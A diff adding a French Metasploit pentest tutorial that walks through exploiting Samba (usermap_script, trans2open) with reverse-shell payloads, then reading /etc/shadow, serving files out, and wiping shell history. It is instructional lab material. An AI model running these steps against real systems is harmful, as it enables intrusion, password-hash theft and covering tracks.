@@ -1,0 +1,101 @@
+#########################################################
+#     🔥 TUTO COMPLET : UTILISER METASPLOIT EN PENTEST  #
+#########################################################
+
+PHASE 1 – LANCER ET COMPRENDRE METASPLOIT
+------------------------------------------
+1. Lancer Metasploit :
+    msfconsole
+
+2. Voir l’aide :
+    help
+
+
+PHASE 2 – RECHERCHE D’UN MODULE
+--------------------------------
+3. Rechercher un exploit lié à un service :
+    search samba
+    search apache 1.3.20
+    search mod_ssl
+    search cve:2003-0201
+
+4. Astuces de filtre :
+    search type:exploit
+    search platform:linux
+    search type:auxiliary
+
+
+PHASE 3 – UTILISER UN MODULE D’EXPLOIT
+---------------------------------------
+5. Charger le module :
+    use exploit/multi/samba/usermap_script
+    ou
+    use <numero>
+
+6. Voir les options nécessaires :
+    show options
+
+7. Définir les paramètres :
+    set RHOSTS 192.168.1.187     # IP cible
+    set LHOST 192.168.1.126      # Ton IP Kali
+    set LPORT 4444
+
+
+PHASE 4 – CHOISIR UN PAYLOAD
+------------------------------
+8. Voir les payloads compatibles :
+    show payloads
+
+9. Payloads recommandés :
+    cmd/unix/reverse                  (Linux simple)
+    linux/x86/meterpreter/reverse_tcp  (Linux x86)
+    windows/meterpreter/reverse_tcp    (Windows)
+
+10. Choisir un payload :
+    set PAYLOAD cmd/unix/reverse
+    ou
+    set PAYLOAD <numero>
+
+
+PHASE 5 – LANCER L’EXPLOIT
+----------------------------
+11. Exécuter l’exploit :
+    run
+
+
+PHASE 6 – INTERAGIR AVEC LA SESSION
+------------------------------------
+12. Lister les sessions ouvertes :
+    sessions
+
+13. Interagir avec une session :
+    sessions -i <id>
+
+14. Exemples de commandes à tester :
+    whoami
+    uname -a
+    id
+
+
+PHASE 7 – EXEMPLE CONCRET (TRANS2OPEN)
+---------------------------------------
+msfconsole
+search trans2open
+use exploit/linux/samba/trans2open
+set RHOSTS 192.168.1.187
+set PAYLOAD cmd/unix/reverse
+run
+
+
+PHASE 8 – POST-EXPLOITATION
+----------------------------
+- Lire les fichiers sensibles :
+    cat /etc/passwd
+    cat /etc/shadow
+
+- Transférer un fichier :
+    python3 -m http.server
+
+- Nettoyer :
+    history -c
+    echo "" > ~/.bash_history
